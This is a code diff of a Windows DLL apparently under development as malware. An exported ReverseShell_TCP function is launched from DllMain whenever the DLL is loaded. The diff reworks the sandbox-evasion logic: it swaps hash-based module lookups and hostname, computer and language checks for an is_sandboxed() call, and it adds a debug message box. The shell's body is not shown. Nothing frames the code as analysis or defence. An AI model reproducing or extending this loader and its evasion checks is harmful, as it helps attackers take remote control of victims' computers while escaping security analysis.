@@ -4,7 +4,7 @@
 #include <stdio.h>
 #include <stdbool.h>
 
-#include "winapi.h"
+#include "libc.h"
 #include "sandbox.h"
 
 #pragma comment(lib, "ws2_32.lib")
@@ -13,25 +13,9 @@
 #define UTF16(x)    _UTF16(x)
 
 
-// Function to get the length of a string
-size_t strlen(const char* str) {
-    const char* s = str;
-    while (*s) {
-        s++;
-    }
-    return s - str;
-}
-
-static bool sandbox_checks() {
-    HMODULE hKernel32 = CustomGetModuleHandle(KERNEL32_HASH);
-    HMODULE hUser32   = CustomGetModuleHandle(USER32_HASH);
-
-    return !is_valid_hostname(get_hostname(hKernel32)) ||
-           !is_valid_computer(hKernel32) ||
-           !is_valid_language(hKernel32, hUser32);
-}
-
 __declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
+    MessageBoxA(0, "ReverseShell_TCP", "ReverseShell_TCP", 0);
+    
     // Initialiser la bibliothèque WinSock
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -96,8 +80,13 @@ __declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     (void)hinstDLL; (void)lpvReserved;
-    if (fdwReason == DLL_PROCESS_ATTACH && sandbox_checks())
-        CreateThread(0, 0, (void*)ReverseShell_TCP, 0, 0, 0);
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        // Check if the process is sandboxed
+        if (is_sandboxed()) {
+            //unload the DLL if sandbox checks fail
+        } else {
+            CreateThread(0, 0, (void*)ReverseShell_TCP, 0, 0, 0);
+        }
+    }
     return TRUE;
 }
-
